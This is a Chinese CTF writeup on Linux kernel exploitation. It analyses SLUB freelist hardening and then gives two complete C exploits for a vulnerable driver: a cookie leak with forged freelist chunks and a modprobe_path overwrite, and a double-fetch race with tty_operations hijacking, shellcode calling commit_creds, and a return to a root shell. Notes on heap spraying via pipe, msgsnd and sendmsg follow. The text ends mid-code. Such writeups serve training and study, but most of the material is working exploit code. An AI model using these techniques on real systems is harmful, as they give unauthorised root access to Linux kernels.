通过篡改fd指针产生的报错我们得知错误发生在mm/slub.c文件里，然后查看源码，进行分析。 查看source/mm/slub.c源码，在freelist_ptr函数中找到了xor加密的字样，如下： 123456789101112131415161718/******************************************************************** * Core slab cache functions *******************************************************************//* * Returns freelist pointer (ptr). With hardening, this is obfuscated * with an XOR of the address where the pointer is held and a per-cache * random number. */static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr, unsigned long ptr_addr)&#123;#ifdef CONFIG_SLAB_FREELIST_HARDENED return (void *)((unsigned long)ptr ^ s-&gt;random ^ ptr_addr);#else return ptr;#endif&#125; 然后查看__kmalloc函数源码： 12345678910111213141516171819202122void *__kmalloc(size_t size, gfp_t flags)&#123; struct kmem_cache *s; void *ret; if (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) return kmalloc_large(size, flags); s = kmalloc_slab(size, flags); //通过size获取对应的kmem_cache if (unlikely(ZERO_OR_NULL_PTR(s))) return s; ret = slab_alloc(s, flags, _RET_IP_); //通过kmem_cache获取指针 trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags); kasan_kmalloc(s, ret, size, flags); return ret; //将指针返回给用户&#125;EXPORT_SYMBOL(__kmalloc); 在source/mm/slab_common.c中查看kmalloc_slab源码： 12345678910111213141516171819202122232425262728/* * Find the kmem_cache structure that serves a given size of * allocation */struct kmem_cache *kmalloc_slab(size_t size, gfp_t flags)&#123; int index; if (unlikely(size &gt; KMALLOC_MAX_SIZE)) &#123; WARN_ON_ONCE(!(flags &amp; __GFP_NOWARN)); return NULL; &#125; if (size &lt;= 192) &#123; //用size确定index if (!size) return ZERO_SIZE_PTR; index = size_index[size_index_elem(size)]; &#125; else index = fls(size - 1);#ifdef CONFIG_ZONE_DMA if (unlikely((flags &amp; GFP_DMA))) return kmalloc_dma_caches[index];#endif return kmalloc_caches[index]; //将对应index的kmem_cache返回给__kmalloc&#125; 在mm/slub.c中查看slab_alloc源码： 12345static __always_inline void *slab_alloc(struct kmem_cache *s, gfp_t gfpflags, unsigned long addr)&#123; return slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);&#125; slab_alloc_node源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697/* * Inlined fastpath so that allocation functions (kmalloc, kmem_cache_alloc) * have the fastpath folded into their functions. So no function call * overhead for requests that can be satisfied on the fastpath. * * The fastpath works by first checking if the lockless freelist can be used. * If not then __slab_alloc is called for slow processing. * * Otherwise we can simply pick the next object from the lockless free list. */static __always_inline void *slab_alloc_node(struct kmem_cache *s, gfp_t gfpflags, int node, unsigned long addr)&#123; void *object; struct kmem_cache_cpu *c; struct page *page; unsigned long tid; s = slab_pre_alloc_hook(s, gfpflags); if (!s) return NULL;redo: /* * Must read kmem_cache cpu data via this cpu ptr. Preemption is * enabled. We may switch back and forth between cpus while * reading from one cpu area. That does not matter as long * as we end up on the original cpu again when doing the cmpxchg. * * We should guarantee that tid and kmem_cache are retrieved on * the same cpu. It could be different if CONFIG_PREEMPT so we need * to check if it is matched or not. */ do &#123; tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid); c = raw_cpu_ptr(s-&gt;cpu_slab); //获取kmem_cache_cpu结构体指针 &#125; while (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp; unlikely(tid != READ_ONCE(c-&gt;tid))); /* * Irqless object alloc/free algorithm used here depends on sequence * of fetching cpu_slab's data. tid should be fetched before anything * on c to guarantee that object and page associated with previous tid * won't be used with current tid. If we fetch tid first, object and * page could be one associated with next tid and our alloc/free * request will be failed. In this case, we will retry. So, no problem. */ barrier(); /* * The transaction ids are globally unique per cpu and per operation on * a per cpu queue. Thus they can be guarantee that the cmpxchg_double * occurs on the right processor and that there was no operation on the * linked list in between. */ object = c-&gt;freelist; //获取freelist page = c-&gt;page; if (unlikely(!object || !node_match(page, node))) &#123; object = __slab_alloc(s, gfpflags, node, addr, c); stat(s, ALLOC_SLOWPATH); &#125; else &#123; void *next_object = get_freepointer_safe(s, object);//调用get_freepointer_safe,通过object获取next_object /* * The cmpxchg will only match if there was no additional * operation and if we are on the right processor. * * The cmpxchg does the following atomically (without lock * semantics!) * 1. Relocate first pointer to the current per cpu area. * 2. Verify that tid and freelist have not been changed * 3. If they were not changed replace tid and freelist * * Since this is without lock semantics the protection is only * against code executing on this cpu *not* from access by * other cpus. */ if (unlikely(!this_cpu_cmpxchg_double( s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid, object, tid, next_object, next_tid(tid)))) &#123; note_cmpxchg_failure("slab_alloc", s, tid); goto redo; &#125; prefetch_freepointer(s, next_object);//调用prefetch_freepointer,检测next_objext的next_object是否合法 stat(s, ALLOC_FASTPATH); &#125; if (unlikely(gfpflags &amp; __GFP_ZERO) &amp;&amp; object) memset(object, 0, s-&gt;object_size); slab_post_alloc_hook(s, gfpflags, 1, &amp;object); return object;&#125; 查看mm/slub.c中get_freepointer_safe源码，发现其中调用了freelist_ptr： 1234567891011121314151617181920212223242526272829303132333435static inline void *get_freepointer_safe(struct kmem_cache *s, void *object)&#123; unsigned long freepointer_addr; void *p; if (!debug_pagealloc_enabled()) return get_freepointer(s, object); freepointer_addr = (unsigned long)object + s-&gt;offset; probe_kernel_read(&amp;p, (void **)freepointer_addr, sizeof(p)); return freelist_ptr(s, p, freepointer_addr);&#125;//-----------------------------------------------------------------------------------------------static inline void *get_freepointer(struct kmem_cache *s, void *object)&#123; return freelist_dereference(s, object + s-&gt;offset);&#125;/* Returns the freelist pointer recorded at location ptr_addr. */static inline void *freelist_dereference(const struct kmem_cache *s, void *ptr_addr)&#123; return freelist_ptr(s, (void *)*(unsigned long *)(ptr_addr), (unsigned long)ptr_addr);&#125;//-----------------------------------------------------------------------------------------------static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr, unsigned long ptr_addr)&#123;#ifdef CONFIG_SLAB_FREELIST_HARDENED return (void *)((unsigned long)ptr ^ s-&gt;random ^ ptr_addr);#else return ptr;#endif&#125; 查看mm/slub.c中prefetch_freepointer，其中调用了freelist_dereference，再调用了freelist_ptr： 1234567891011121314151617181920212223static void prefetch_freepointer(const struct kmem_cache *s, void *object)&#123; if (object) prefetch(freelist_dereference(s, object + s-&gt;offset));&#125;/* Returns the freelist pointer recorded at location ptr_addr. */static inline void *freelist_dereference(const struct kmem_cache *s, void *ptr_addr)&#123; return freelist_ptr(s, (void *)*(unsigned long *)(ptr_addr), (unsigned long)ptr_addr);&#125;static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr, unsigned long ptr_addr)&#123;#ifdef CONFIG_SLAB_FREELIST_HARDENED return (void *)((unsigned long)ptr ^ s-&gt;random ^ ptr_addr);#else return ptr;#endif&#125; 下载源码放进IDA看了一下，在__kmalloc函数中果然有xor的地方： 解法一：看Kirin师傅的wp学习一波。关于源码的分析都已经写在上面了。 http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer 思路：目的是控制pool，然后任意地址写，实施过程中有两个关键点： leak cookie bypass prefetcht0 byte ptr [rbx] cookie其实有两种办法泄露，一种是直接看源码，另一种是free两个已知地址的堆块，然后利用uaf来读fd位置的值，再经过xor运算得cookie。需要注意的是不同size(指2的次方不同)的chunk的cookie是不同的，但是同一size的cookie是永远不变的。也就是一个kmem_cache一个cookie。至于泄露堆地址，则需要一些几率，exp常常会分配到在offset=0x28的位置存有self_addr+0x28的值的chunk，应该是某一种特殊的chunk留下的脏数据，可利用这一点来泄露堆地址。并为后面伪造fake_chunk做好准备。 比较复杂的是伪造fake_chunk来绕过prefetch0 byte ptr [rbx]的检查。需要精心构造两个fake_chunk及其fd，fake_chunk1的目的一是劫持freelist链到0xffffffffc000461c，二是写入四字节使0xffffffffc000461c的fd解密后能落到fake_chunk2。fake_chunk2的目的是为分配出0xffffffffc000461c这一目的chunk之后使freelist顺利结束(检测到*chunk=chunk^cookie即判断为结束，即next_object=0)。 原本： 123|-----------| |------------|| 1 | ---&gt; | 0 ||-----------| |------------| 期望： 123|----------| |-------------| |--------------------| |-----------| |---|| 1 | ---&gt; | fake_chunk1 | ---&gt; | 0xffffffffc000461c | ---&gt; |fake_chunk2| ---&gt; | 0 ||----------| |-------------| |--------------------| |-----------| |---| exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sched.h&gt;#include &lt;errno.h&gt;#include &lt;pty.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;#include &lt;signal.h&gt;struct chunk&#123; size_t index; char* buf; long long size;&#125;;struct chunk* user_chunk;void uread(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30003,user_chunk);&#125;void uwrite(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30002,user_chunk);&#125;void new(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30000,user_chunk);&#125;void delete(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30001,user_chunk);&#125;int main()&#123; int fd = open("/dev/noob",0); if(fd &lt; 0)&#123; puts("[:(]Open error..."); exit(0); &#125; user_chunk = (struct chunk*)malloc(sizeof(struct chunk)); size_t* buf = malloc(0x1000); int id[2] = &#123;0&#125;; size_t address[2] = &#123;0&#125;; int j=0; for(int i = 0;i &lt;= 20;i++)&#123; new(fd,i,buf,0x40); uread(fd,i,buf,0x40); if(buf[5]==buf[6] &amp;&amp; buf[5]!=0)&#123; id[j] = i; address[j++] = buf[5]-0x28; if(j==2)&#123; break; &#125; &#125; &#125; if(id[1] == 0)&#123; puts("[:(]Don't find...bad luck...QAQ"); exit(-1); &#125; printf("[:)]%d and %d is our target\n",id[0],id[1]); printf("[:)]%d addr = %p\n",id[0],address[0]); printf("[:)]%d addr = %p\n",id[1],address[1]); delete(fd,id[0],buf,0x40); delete(fd,id[1],buf,0x40); uread(fd,id[1],buf,0x40); size_t key = *buf; size_t cookie = key ^ address[0] ^ address[1]; printf("[:)]cookie = %p\n",cookie); size_t mod_base = 0xffffffffc0002000; long int magic1 = (cookie^mod_base) &gt;&gt; 32; printf("[:)]magic1 = %p\n",magic1); long int fake_mmap1 = mmap(magic1 &amp; 0xfffff000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,0,0); if(fake_mmap1 &lt; 0)&#123; puts("[:(]mmap error..."); exit(0); &#125; printf("[:)]fake_mmap1 = %p\n",fake_mmap1); long int fake_chunk = magic1 &amp; 0xffffffff; printf("[:)]fake_chunk = %p\n",fake_chunk); long int magic2 = (fake_chunk&lt;&lt;32)^cookie^0xffffffffc000461c; printf("[:)]magic2 = %p\n",magic2); long int fake_mmap2 = mmap(magic2 &amp; 0xfffff000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,0,0); if(fake_mmap2 &lt; 0)&#123; puts("[:(]mmap error..."); exit(1); &#125; printf("[:)]fake_mmap2 = %p\n",fake_mmap2); *(long int *)magic2 = magic2^cookie; *(long int*)fake_chunk = cookie ^ fake_chunk; buf[0] = fake_chunk ^ cookie ^ address[1]; uwrite(fd,id[1],buf,0x40); new(fd,21,buf,0x40); *(long int*)fake_chunk = cookie ^ fake_chunk ^ 0xffffffffc000461c; new(fd,22,buf,0x40); new(fd,23,buf,0x40); new(fd,24,buf,0x40); new(fd,25,buf,0x40); //----------------------------------------------------------- *buf = 0x8245aba000000000; buf[1] = 0x00000040ffffffff; uwrite(fd,23,buf,0x40); *buf = 0x7340682e777278782f; uwrite(fd,22,buf,0x40); puts("[:)]success!!!"); system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' &gt; /xxrw.sh"); system("/bin/chmod +x /xxrw.sh"); system("echo -ne '\\xff\\xff\\xff\\xff' &gt; /trigger"); system("/bin/chmod +x /trigger"); system("/trigger"); system("cat /flag"); return 0;&#125;//ffffffff8245aba0 D modprobe_path 解法二：思路：在add函数中存在double fetch，但是概率实在是太低了，我把size的限制给patch掉之后，写出exp是可以打成功的。但是考虑到竞争因素以后，成功概率应该不到百分之一了。。。 PS: 今天出了官方wp。。。竟然真的是这种解法。。。我吐了。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;memory.h&gt;#include &lt;pty.h&gt;struct chunk&#123; size_t index; char* buf; long long size;&#125;;int finish;struct chunk* user_chunk;void change_size()&#123; while(finish == 0)&#123; user_chunk-&gt;size = 0x400; &#125;&#125;size_t prepare_kernel_cred = 0xffffffff810ad7e0;size_t commit_creds = 0xffffffff810ad430;size_t user_cs,user_ss,user_rsp,user_rflags;void save()&#123; __asm__( "mov user_cs,cs;" "mov user_ss,ss;" "mov user_rsp,rsp;" "pushf;" "pop user_rflags;" ); puts("[:)]Save success!!!");&#125;void get_shell()&#123; if(getuid() == 0)&#123; puts("[:)]Root now!!!"); system("/bin/sh"); exit(0); &#125; else&#123; puts("[:(]Not root..."); exit(0); &#125;&#125;void uread(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30003,user_chunk);&#125;void uwrite(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30002,user_chunk);&#125;void new(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30000,user_chunk);&#125;void delete(int fd,int index,char* buf,long long size)&#123; user_chunk-&gt;index = (size_t)index; user_chunk-&gt;buf = buf; user_chunk-&gt;size = size; ioctl(fd,0x30001,user_chunk);&#125;int main()&#123; save(); signal(SIGSEGV,get_shell); int fd = open("/dev/noob",0); if(fd &lt; 0 )&#123; printf("[:(]Open error...\n"); exit(-1); &#125; user_chunk = (struct chunk*)malloc(sizeof(struct chunk)); char* buf = malloc(0x1000); pthread_t p; pthread_create(&amp;p,NULL,change_size,NULL); new(fd,0,buf,0x68); finish = 1; delete(fd,0,buf,0); int fd_p = open("/dev/ptmx",2); if(fd_p &lt; 0)&#123; puts("[:(]put error..."); exit(0); &#125; size_t fake_tty_operations[13] = &#123;0&#125;; fake_tty_operations[12] = 0xffffffff81075fa0; memset(buf,'\x00',0x2e0); uread(fd,0,buf,0x2e0); size_t tty_struct_addr = *((size_t*)buf+7)-0x38; printf("[:)]tty_struct_addr = %p\n",tty_struct_addr); *((size_t*)buf+3) = (size_t)fake_tty_operations; uwrite(fd,0,buf,0x20); ioctl(fd_p,0x2333,1); fake_tty_operations[12] = tty_struct_addr + 0x2e0; char* tmp = buf + 0x2e0; *(unsigned short *)tmp = 0x9090; tmp += 2; *(unsigned long *)tmp = 0x90ff3148; tmp += 3; *(unsigned short *)tmp = 0xb848; tmp += 2; *(unsigned long *)tmp = prepare_kernel_cred; tmp += 8; *(unsigned short *)tmp = 0xd0ff; tmp += 2; *(unsigned long *)tmp = 0x90c78948; tmp += 3; *(unsigned short *)tmp = 0xb848; tmp += 2; *(unsigned long *)tmp = commit_creds; tmp += 8; *(unsigned short *)tmp = 0xd0ff; tmp += 2; *(unsigned int *)tmp = 0xf0c7c748; //mov rdi,0x6f0; tmp += 4; *(unsigned char *)tmp = 0x06; tmp += 1; *(unsigned short*)tmp = 0x0; tmp += 2; *(unsigned short*)tmp = 0x220f; //mov cr4,rdi; tmp += 2; *(unsigned char*)tmp = 0xe7; tmp += 1; *(unsigned char*)tmp = 0x6a; //push user_ss tmp += 1; *(unsigned char*)tmp = (unsigned char)user_ss; tmp += 1; *(unsigned short *)tmp = 0xB848; //push user_rsp tmp += 2; *(unsigned long *)tmp = user_rsp; tmp += 8; *(unsigned char *)tmp = 'P'; tmp += 1; *(unsigned char*)tmp = 0x68; //push rflags tmp += 1; *(unsigned int*)tmp = (unsigned int)user_rflags; tmp += 4; *(unsigned char*)tmp = 0x6a; //push user_cs tmp += 1; *(unsigned char*)tmp = (unsigned char)user_cs; tmp += 1; *(unsigned char*)tmp = 0x68; //push get_shell tmp += 1; *(unsigned int*)tmp = (unsigned int)get_shell; tmp += 4; *(unsigned short*)tmp = 0x010f; //swapgs; tmp += 2; *(unsigned char*)tmp = 0xf8; tmp += 1; *(unsigned short*)tmp = 0xcf48; //iretq; tmp += 2; *((size_t*)buf+3) = (size_t)fake_tty_operations; uwrite(fd,0,buf,0x400); ioctl(fd_p,0x2333,1); return 0;&#125; 20190CTF-FINAL_Fast&amp;Furious20190CTF-FINAL_Fast&amp;Furious22019N1CTF_babykernel2019Hack.lu_babykernel22019TeaserCONFidence_p4fmthttp://brieflyx.me/2019/ctf-writeups/p4teaser-2019-p4fmt/ https://xz.aliyun.com/t/4574 20170CTF_knote20180CTF_zerofs2018WCTF_klist思路：又是一道关于竞争的题目，准备总结一下关于竞争的一些东西。。。 我个人觉得竞争的题目最难的地方在于如何用用户态的程序稳定的触发竞争漏洞，并使程序可以继续运行下去，不会崩掉，还有就是调试比较麻烦。。。 这道题的漏洞点是在list_head中的puts操作放在了锁的外面，且是直接对glist这个全局变量进行的操作(前面的都是对栈上的原始变量进行的操作)，所以会导致竞争add，在puts前更新glist，获取一个悬垂指针。 好像不同的线程/进程申请相同大小size的chunk会从不同的slab中取，因为是不同的cpu_slab吧应该，毕竟是多核。 之后的问题就是怎么在用户态中通过调用函数来控制这个UAF的chunk，这里用的是pipe函数，在其alloc_pipe_info函数内部会申请0x280的chunk作为pipe的一个结构体貌似，然后用write可使size位置不断增大，一次就足够了。 需要提一下的是通用堆喷技术(userfaultfd+setxattr)在这里是无法使用的，因为内核并不支持userfaultfd系统调用，应该是编译时并没有开启CONFIG_USERFAULTFD吧。 还有就是好像第三次free目标chunk时，好像被放到了另外一个slab中，如果不是的话next_ptr应该一直指向自己，因为前面已经double free了。 关于堆喷：pipe跟到alloc_pipe_info函数内部看了一下，发现有一个__kmalloc(0x280)的地方，且其返回的指针确实为我们的悬垂指针。 需要注意的是只能申请0x280，且内容不可控。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145 _ ___ ___ ____ _____ | |/ / | |_ _/ ___|_ _| | ' /| | | |\___ \ | | | . \| |___ | | ___) || | |_|\_\_____|___|____/ |_| / # cat /proc/kallsyms | grep ffffffff81188870ffffffff81188870 T kmem_cache_alloc_trace/ # cat /proc/kallsyms | grep ffffffff81188d00ffffffff81188d00 T __kmalloc/ # cat /proc/kallsyms | grep ffffffff8108ee60ffffffff8108ee60 T __init_waitqueue_head/ # cat /proc/kallsyms | grep ffffffff81093260ffffffff81093260 T __mutex_init/ # RAX: 0xffff88007a056e40 --&gt; 0x3e800000002 RBX: 0xffff88007b9f4ff8 --&gt; 0x0 RCX: 0x1 RDX: 0x88 RSI: 0x15080c0 RDI: 0xffff88007cc01800 --&gt; 0x23b20 RBP: 0xffffc90000b8fed8 --&gt; 0x0 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a37da --&gt; 0xc08548fffe5091e8 R8 : 0xffff88007f624ae0 --&gt; 0xffff88007b354618 --&gt; 0xffff88007b354640 --&gt; 0xffff88007b354668 --&gt; 0xffff88007b354690 --&gt; 0xffff88007b3546b8 (--&gt; ...)R9 : 0x0 R10: 0xffff88007b3545f0 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x100000 R14: 0x0 R15: 0x0EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a37c9: mov edx,0x88 0xffffffff811a37ce: mov esi,0x15080c0 0xffffffff811a37d3: mov r13d,DWORD PTR [rip+0x10bf026] # 0xffffffff82262800=&gt; 0xffffffff811a37da: call 0xffffffff81188870 #kmem_cache_alloc_trace 0xffffffff811a37df: test rax,rax 0xffffffff811a37e2: je 0xffffffff811a3910 0xffffffff811a37e8: cmp r13d,0xffff 0xffffffff811a37ef: mov rbx,raxGuessed arguments:arg[0]: 0xffff88007cc01800 --&gt; 0x23b20 arg[1]: 0x15080c0 arg[2]: 0x88 RAX: 0x0 RBX: 0xffff88007b3c8780 --&gt; 0x0 RCX: 0x0 RDX: 0x0 RSI: 0x15080c0 RDI: 0x280 RBP: 0x10 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a3851 --&gt; 0xc08548fffe54aae8 R8 : 0xffff88007f623b20 --&gt; 0xffff88007b3c8840 --&gt; 0xffff88007b3c8900 --&gt; 0xffff88007b3c89c0 --&gt; 0xffff88007b3c8a80 --&gt; 0xffff88007b3c8b40 (--&gt; ...)R9 : 0x0 R10: 0xffff88007b3c8780 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x10 R14: 0x0 R15: 0x0EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a3843: lea rdi,[r13+r13*4+0x0] 0xffffffff811a3848: mov esi,0x15080c0 0xffffffff811a384d: shl rdi,0x3=&gt; 0xffffffff811a3851: call 0xffffffff81188d00 #__kmalloc 0xffffffff811a3856: test rax,rax 0xffffffff811a3859: mov QWORD PTR [rbx+0x78],rax 0xffffffff811a385d: je 0xffffffff811a38fe 0xffffffff811a3863: lea rdi,[rbx+0x20]Guessed arguments:arg[0]: 0x280 arg[1]: 0x15080c0 RAX: 0xffff88007ace8c00 --&gt; 0x0 RBX: 0xffff88007b3c8780 --&gt; 0x0 RCX: 0x0 RDX: 0xffffffff828e9558 --&gt; 0x0 RSI: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")RDI: 0xffff88007b3c87a0 --&gt; 0x0 RBP: 0x10 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a3875 --&gt; 0x1b848ffeeb5e6e8 R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)R9 : 0x0 R10: 0xffff88007ace8c00 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x10 R14: 0x0 R15: 0x0EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a3863: lea rdi,[rbx+0x20] 0xffffffff811a3867: mov rdx,0xffffffff828e9558 0xffffffff811a386e: mov rsi,0xffffffff81ff2684=&gt; 0xffffffff811a3875: call 0xffffffff8108ee60 #__init_waitqueue_head 0xffffffff811a387a: movabs rax,0x100000001 0xffffffff811a3884: mov DWORD PTR [rbx+0x40],r13d 0xffffffff811a3888: mov QWORD PTR [rbx+0x80],r12 0xffffffff811a388f: mov QWORD PTR [rbx+0x54],raxGuessed arguments:arg[0]: 0xffff88007b3c87a0 --&gt; 0x0 arg[1]: 0xffffffff81ff2684 ("&amp;pipe-&gt;wait")arg[2]: 0xffffffff828e9558 --&gt; 0x0 RAX: 0x100000001 RBX: 0xffff88007b3c8780 --&gt; 0x0 RCX: 0x0 RDX: 0xffffffff828e9558 --&gt; 0x0 RSI: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")RDI: 0xffff88007b3c8780 --&gt; 0x0 RBP: 0x10 RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 RIP: 0xffffffff811a38a4 --&gt; 0xd88948ffeef9b7e8 R8 : 0xffff88007f623b80 --&gt; 0xffff88007ace9400 --&gt; 0xffff88007ace9800 --&gt; 0xffff88007ace9c00 --&gt; 0xffff88007acea000 --&gt; 0xffff88007acea400 (--&gt; ...)R9 : 0x0 R10: 0xffff88007ace8c00 --&gt; 0x0 R11: 0x0 R12: 0xffff88007c598c00 --&gt; 0xcb000000ce R13: 0x10 R14: 0x0 R15: 0x0EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xffffffff811a3893: mov rdi,rbx 0xffffffff811a3896: mov rdx,0xffffffff828e9558 0xffffffff811a389d: mov rsi,0xffffffff81ff2690=&gt; 0xffffffff811a38a4: call 0xffffffff81093260 #__mutex_init 0xffffffff811a38a9: mov rax,rbx 0xffffffff811a38ac: pop rbx 0xffffffff811a38ad: pop rbp 0xffffffff811a38ae: pop r12Guessed arguments:arg[0]: 0xffff88007b3c8780 --&gt; 0x0 arg[1]: 0xffffffff81ff2690 ("&amp;pipe-&gt;mutex")arg[2]: 0xffffffff828e9558 --&gt; 0x0 msgsnd我也跟了一下，是可行的，需要注意的是前0x30字节不可控。 123456789101112// 只能控制0x30字节以后的内容struct &#123; long mtype; char mtext[BUFF_SIZE-0x30];&#125;msg;memset(msg.mtext,0x42,BUFF_SIZE-0x30-1); // 布置用户空间的内容msg.mtext[BUFF_SIZE-0x30] = 0;msg.mtype = 1; //必须 &gt; 0int msqid = msgget(IPC_PRIVATE,0644|IPC_CREAT);for(int i = 0; i &lt; 120; i++) msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0); 调用链： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// /ipc/msg.cSYSCALL_DEFINE4(msgsnd, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz, int, msgflg)&#123; return ksys_msgsnd(msqid, msgp, msgsz, msgflg);&#125;// /ipc/msg.clong ksys_msgsnd(int msqid, struct msgbuf __user *msgp, size_t msgsz, int msgflg)&#123; long mtype; if (get_user(mtype, &amp;msgp-&gt;mtype)) return -EFAULT; return do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);&#125;// /ipc/msg.cstatic long do_msgsnd(int msqid, long mtype, void __user *mtext, size_t msgsz, int msgflg)&#123; struct msg_queue *msq; struct msg_msg *msg; int err; struct ipc_namespace *ns; DEFINE_WAKE_Q(wake_q); ns = current-&gt;nsproxy-&gt;ipc_ns; if (msgsz &gt; ns-&gt;msg_ctlmax || (long) msgsz &lt; 0 || msqid &lt; 0) return -EINVAL; if (mtype &lt; 1) return -EINVAL; msg = load_msg(mtext, msgsz); // 调用load_msg...// /ipc/msgutil.cstruct msg_msg *load_msg(const void __user *src, size_t len)&#123; struct msg_msg *msg; struct msg_msgseg *seg; int err = -EFAULT; size_t alen; msg = alloc_msg(len); // alloc_msg if (msg == NULL) return ERR_PTR(-ENOMEM); alen = min(len, DATALEN_MSG); // DATALEN_MSG if (copy_from_user(msg + 1, src, alen)) // copy1 goto out_err; for (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) &#123; len -= alen; src = (char __user *)src + alen; alen = min(len, DATALEN_SEG); if (copy_from_user(seg + 1, src, alen)) // copy2 goto out_err; &#125; err = security_msg_msg_alloc(msg); if (err) goto out_err; return msg;out_err: free_msg(msg); return ERR_PTR(err);&#125;// /ipc/msgutil.c#define DATALEN_MSG ((size_t)PAGE_SIZE-sizeof(struct msg_msg))static struct msg_msg *alloc_msg(size_t len)&#123; struct msg_msg *msg; struct msg_msgseg **pseg; size_t alen; alen = min(len, DATALEN_MSG); msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); // 先分配了一个msg_msg结构大小... 1msgsnd() ---&gt; ksys_msgsnd() ---&gt; do_msgsnd() ---&gt; load_msg(用cat /proc/kallsyms | grep load_msg) sendmsg同样跟着调了一下，是可以成功的，需要注意的是size必须大于44，但是内容是全部可控的。 1234567891011121314151617//限制: BUFF_SIZE &gt; 44char buff[BUFF_SIZE];struct msghdr msg = &#123;0&#125;;struct sockaddr_in addr = &#123;0&#125;;int sockfd = socket(AF_INET, SOCK_DGRAM, 0);addr.sin_addr.s_addr = 